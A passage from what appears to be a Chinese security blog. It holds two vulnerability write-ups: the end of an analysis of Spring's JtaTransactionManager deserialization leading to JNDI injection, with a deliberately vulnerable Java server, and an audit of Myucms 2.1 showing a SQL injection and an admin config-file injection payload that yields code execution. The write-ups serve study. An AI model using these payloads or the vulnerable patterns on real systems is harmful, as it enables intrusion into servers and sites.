<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">			System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line">			<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">				Socket socket=serverSocket.accept();</span><br><span class="line">				System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());</span><br><span class="line">				ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Object object = objectInputStream.readObject();</span><br><span class="line">					System.out.println(<span class="string">"Read object "</span>+object);</span><br><span class="line">				&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">					System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地8000端口开启Web服务，并将ExportObject.class放在Web服务下</p>
<p>先运行Server端，再运行Client端</p>
<p><img src="https://s2.ax1x.com/2020/03/06/3b5BGt.png" alt="3b5BGt.png"></p>
<h4 id="漏洞调用链分析"><a href="#漏洞调用链分析" class="headerlink" title="漏洞调用链分析"></a>漏洞调用链分析</h4><p>跟进org.springframework.transaction.jta.JtaTransactionManager下readobject方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">    <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">    initUserTransactionAndTransactionManager();</span><br><span class="line">    initTransactionSynchronizationRegistry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进initUserTransactionAndTransactionManager()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA UserTransaction from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">			<span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = retrieveUserTransaction();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction at its default JNDI location.</span></span><br><span class="line">				<span class="keyword">this</span>.userTransaction = findUserTransaction();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA TransactionManager from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.transactionManagerName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = lookupTransactionManager(<span class="keyword">this</span>.transactionManagerName);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = retrieveTransactionManager();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectTransactionManager) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction object that implements TransactionManager,</span></span><br><span class="line">				<span class="comment">// and check fallback JNDI locations otherwise.</span></span><br><span class="line">				<span class="keyword">this</span>.transactionManager = findTransactionManager(<span class="keyword">this</span>.userTransaction);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If only JTA TransactionManager specified, create UserTransaction handle for it.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">this</span>.userTransaction = buildUserTransaction(<span class="keyword">this</span>.transactionManager);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进lookupUserTransaction函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> getJndiTemplate().lookup(userTransactionName, UserTransaction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(</span><br><span class="line">				<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, ex);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着跟进getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</p>
<p>进一步跟进lookup</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">			Object located = ctx.lookup(name);</span><br><span class="line">			<span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(</span><br><span class="line">						<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> located;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个lookup函数正是造成JNDI注入的lookup函数，在调用链中，我们可以通过userTransactionName属性值进行JNDI注入，而在client端，我们可以通过调用setUserTransactionName()函数去设置这个属性值，将其设置为我们的userTransactionName属性值，也就是我们设置的恶意RMI服务，进而造成JNDI注入。</p>
<p><strong>最根本的原因也就是在于org.springframework.transaction.jta.JtaTransactionManager类对readObject方法进行了重写，对JDNI注入中的lookup函数进行调用，而lookup的参数我们是可以控制的，所以会导致通过反序列化导致JNDI注入。</strong></p>
<p>PS：吐槽一下..在家学习效率可真太低了…一天的量感觉得分四五天…</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd</a></p>
<p><a href="https://segmentfault.com/a/1190000011291179" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011291179</a></p>
<p><a href="https://blog.csdn.net/Mr_Ming_/article/details/80556066" target="_blank" rel="noopener">https://blog.csdn.net/Mr_Ming_/article/details/80556066</a></p>
<p><a href="https://www.cnblogs.com/xdp-gacl/p/4249939.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/4249939.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckabsu38m0025kkvr9duyg08b" class="article-share-link" data-share="baidu" data-title="Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞">Share</a>
      

      
        <a href="http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Myucms-2-1-SQL注入加后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/" class="article-date">
  <time datetime="2020-02-29T08:11:18.000Z" itemprop="datePublished">2020-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/">Myucms 2.1 SQL注入加后台getshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>找了一个cms审了一下，有趣的是，这个cms的后台getshell挺明显的，本来想着能交个洞，搜了一下这个cms相关的洞…被交过了..而且还发了分析（就在前几天….</p>
<h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><p>这个sql注入挺明显的</p>
<p>位置挺多，随便拉一处来分析一下</p>
<p>/bbs/Comment/ding</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ding</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!session(<span class="string">'userid'</span>) || !session(<span class="string">'username'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请登录'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (session(<span class="string">'userid'</span>)!=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'谁给你的权限？'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = input(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'settop'</span>] = <span class="number">1</span>;</span><br><span class="line">       $datas[<span class="string">'settop'</span>] = <span class="number">0</span>;</span><br><span class="line">        $da = Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">'id'</span>,$id)-&gt;value(<span class="string">'settop'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($datas)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点单拉出来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123; </span><br><span class="line"><span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>id={$id}明显存在注入，打个断点，看一下具体执行的是什么语句，去闭合一下</p>
<p>发现他的闭合形式为 where (id=1),闭合后进行注入即可</p>
<p><img src="https://s2.ax1x.com/2020/02/29/3yAhJP.png" alt="3yAhJP.png"></p>
<h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>这个getshell挺明显的</p>
<p>admin/controller/Config/addqq</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addqq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $path = <span class="string">'application/extra/qq.php'</span>;</span><br><span class="line">   $file = <span class="keyword">include</span> $path;      </span><br><span class="line">   $config = <span class="keyword">array</span>(</span><br><span class="line">     <span class="string">'qq-appid'</span> =&gt; input(<span class="string">'qq-appid'</span>),</span><br><span class="line">     <span class="string">'qq-appkey'</span> =&gt; input(<span class="string">'qq-appkey'</span>),</span><br><span class="line">     <span class="string">'qq-callback'</span> =&gt; input(<span class="string">'qq-callback'</span>),</span><br><span class="line">   );</span><br><span class="line">    $res = array_merge($file, $config);</span><br><span class="line">    $str = <span class="string">'&lt;?php return ['</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $str .= <span class="string">'\''</span> . $key . <span class="string">'\''</span> . <span class="string">'=&gt;'</span> . <span class="string">'\''</span> . $value . <span class="string">'\''</span> . <span class="string">','</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $str .= <span class="string">']; '</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_put_contents($path, $str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改成功'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改失败'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>post传下参数进行闭合：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qq-appid&#x3D;&#39;,phpinfo()];&#x2F;&#x2F;1</span><br></pre></td></tr></table></figure>

<p>访问下主页：<br><a href="https://imgchr.com/i/3yVzb4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/29/3yVzb4.png" alt="3yVzb4.png"></a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看完了五本灵异类小说….终于对这种小说的故事线开始产生厌倦了…</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/" data-id="ckabsu38a001gkkvr7tj379el" class="article-share-link" data-share="baidu" data-title="Myucms 2.1 SQL注入加后台getshell">Share</a>
      

      
        <a href="http://yoursite.com/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
